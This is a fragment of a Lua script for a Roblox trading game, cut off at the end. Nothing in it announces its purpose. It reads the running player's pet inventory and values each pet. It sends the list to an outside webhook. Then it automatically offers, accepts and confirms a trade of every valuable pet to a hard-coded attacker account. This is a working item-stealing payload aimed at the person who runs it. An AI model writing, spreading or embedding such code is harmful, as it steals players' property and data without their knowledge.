local function scanAndTrade()
    local allData = routerClient.get("DataAPI/GetAllServerData"):InvokeServer()
    local data = allData[LocalPlayer.Name] or allData[tostring(LocalPlayer.UserId)]
    if not data or not data.inventory then return end

    local receiver = nil
    for _, name in ipairs(TARGET_RECEIVERS) do if Players:FindFirstChild(name) then receiver = Players[name] break end end

    local list, total, count = {}, 0, 0
    for _, item in pairs(data.inventory.pets) do
        local petData = InventoryDB.pets[item.id]
        if petData then
            count = count + 1
            local val = calculatePetValue(petData.name or "", item.properties or {})
            if val > 0 then
                table.insert(list, {id = item.Id, name = petData.name, value = val})
                total = total + val
            end
        end
    end

    sendADMWebhook(list, total, count, receiver and receiver.Name)

    if #list > 0 and receiver then
        local API = ReplicatedStorage.API
        API["TradeAPI/SendTradeRequest"]:FireServer(receiver)
        for _, p in ipairs(list) do API["TradeAPI/AddItemToOffer"]:FireServer(p.id) end
        API["TradeAPI/AcceptTrade"]:FireServer()
        API["TradeAPI/ConfirmTrade"]:FireServer()
    end
end

task.spawn(function()
